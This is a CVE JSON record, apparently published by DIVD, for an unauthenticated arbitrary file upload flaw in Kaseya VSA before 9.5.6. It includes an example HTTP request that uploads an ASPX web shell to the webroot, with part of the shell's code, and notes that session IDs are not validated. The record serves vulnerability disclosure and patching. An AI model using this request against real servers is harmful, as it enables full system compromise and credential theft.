---
layout: cve-json-40
discovered_by:
  - Wietse Boonstra
json: {
    "CVE_data_meta" : {
        "ASSIGNER": "cve@mitre.org",
        "ID": "CVE-2021-30118",
        "STATE": "PUBLIC",
        "TITLE": "Unauthenticated Remote Code Execution in Kaseya VSA < v9.5.5"
    },
    "affects": {
        "vendor": {
            "vendor_data": [
                {
                    "product": {
                        "product_data": [
                            {
                                "product_name": "Kaseya VSA (On-premise and SaaS)",
                                "version": {
                                    "version_data": [
                                        {
                                            "version_affected": "<",
                                            "version_name": "9.x",
                                            "version_value": "9.5.6"
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    "vendor_name": "Kaseya"
                }
            ]
        }
    },
    "credit": [
        {
            "lang": "eng",
            "value": "Discovered by Wietse Boonstra of DIVD"
        },
        {
            "lang": "eng",
            "value": "Additional research by Frank Breedijk of DIVD"
        }
    ],
    "data_format": "MITRE",
    "data_type": "CVE",
    "data_version": "4.0",
    "description": {
        "description_data": [
            {
                "lang": "eng",
                "value": "An attacker can upload files with the privilege of the Web Server process for Kaseya VSA Unified Remote Monitoring & Management (RMM) 9.5.4.2149 and subsequently use these files to execute asp commands\n\nThe api /SystemTab/uploader.aspx is vulnerable to an unauthenticated arbitrary file upload leading to RCE.  An attacker can upload files with the privilege of the Web Server process and subsequently use these files to execute asp commands.\n\nDetailed description\n---\nGiven the following request:\n```\nPOST /SystemTab/uploader.aspx?Filename=shellz.aspx&PathData=C%3A%5CKaseya%5CWebPages%5C&__RequestValidationToken=ac1906a5-d511-47e3-8500-47cc4b0ec219&qqfile=shellz.aspx HTTP/1.1\nHost: 192.168.1.194\nCookie:  sessionId=92812726; %5F%5FRequestValidationToken=ac1906a5%2Dd511%2D47e3%2D8500%2D47cc4b0ec219\nContent-Length: 12\n\n<%@ Page Language=\"C#\" Debug=\"true\" validateRequest=\"false\" %>\n<%@ Import namespace=\"System.Web.UI.WebControls\" %>\n<%@ Import namespace=\"System.Diagnostics\" %>\n<%@ Import namespace=\"System.IO\" %>\n<%@ Import namespace=\"System\" %>\n<%@ Import namespace=\"System.Data\" %>\n<%@ Import namespace=\"System.Data.SqlClient\" %>\n<%@ Import namespace=\"System.Security.AccessControl\" %> \n<%@ Import namespace=\"System.Security.Principal\" %>\n<%@ Import namespace=\"System.Collections.Generic\" %> \n<%@ Import namespace=\"System.Collections\" %> \n \n<script runat=\"server\">\n \nprivate const string password = \"pass\";  // The password ( pass )\nprivate const string style = \"dark\";  // The style ( light / dark )\n \nprotected void Page_Load(object sender, EventArgs e)\n{\n\t//this.Remote(password);\n\tthis.Login(password);\n\tthis.Style(); \n\tthis.ServerInfo(); \n\t\n<snip>\n```\nThe attacker can control the name of the file written via the qqfile parameter and the location of the file written via the PathData parameter.\n\nEven though the call requires that a sessionId cookie is passed we have determined that the sessionId is not actually validated and any numeric value is accepted as valid.\n\nSecurity issues discovered\n---\n* a sessionId cookie is required by /SystemTab/uploader.aspx, but is not actually validated, allowing an attacker to bypass authentication\n* /SystemTab/uploader.aspx allows an attacker to create a file with arbitrary content in any place the webserver has write access\n* The web server process has write access to the webroot where the attacker can execute it by requesting the URL of the newly created file.\n\nImpact\n---\nThis arbitrary file upload allows an attacker to place files of his own choosing on any location on the hard drive of the server the webserver process has access to, including (but not limited to) the webroot. If the attacker uploads files with code to the webroot (e.g. aspx code) he can then execute this code in the context of the webserver to breach either the integrity, confidentiality, or availability of the system or to steal credentials of other users. In other words, this can lead to a full system compromise.\n"
            }
        ]
    },
    "generator": {
        "engine": "Vulnogram 0.0.9"
    },
    "impact": {
        "cvss": {
            "attackComplexity": "LOW",
            "attackVector": "NETWORK",
            "availabilityImpact": "HIGH",
            "baseScore": 9.8,
            "baseSeverity": "CRITICAL",
            "confidentialityImpact": "HIGH",
            "integrityImpact": "HIGH",
            "privilegesRequired": "NONE",
            "scope": "UNCHANGED",
            "userInteraction": "NONE",
            "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "version": "3.1"
        }
    },
    "problemtype": {
        "problemtype_data": [
            {
                "description": [
                    {
                        "lang": "eng",
                        "value": "CWE-434 Unrestricted Upload of File with Dangerous Type"
                    }
                ]
            }
        ]
    },
    "references": {
        "reference_data": [
            {
                "name": "https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/",
                "refsource": "CONFIRM",
                "url": "https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/"
            },
            {
                "name": "https://csirt.divd.nl/CVE-2021-30118",
                "refsource": "CONFIRM",
                "url": "https://csirt.divd.nl/CVE-2021-30118"
            },
            {
                "name": "https://csirt.divd.nl/DIVD-2021-00011",
                "refsource": "CONFIRM",
                "url": "https://csirt.divd.nl/DIVD-2021-00011"
            },
            {
                "name": "https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021",
                "refsource": "CONFIRM",
                "url": "https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021"
            }
        ]
    },
    "solution": [
        {
            "lang": "eng",
            "value": "SaaS version has been fixed by the vendor.\nUpgrade on-premise to version 9.5.6 or above"
        }
    ],
    "source": {
        "advisory": "DIVD-2021-00011",
        "discovery": "INTERNAL"
    }
}
---

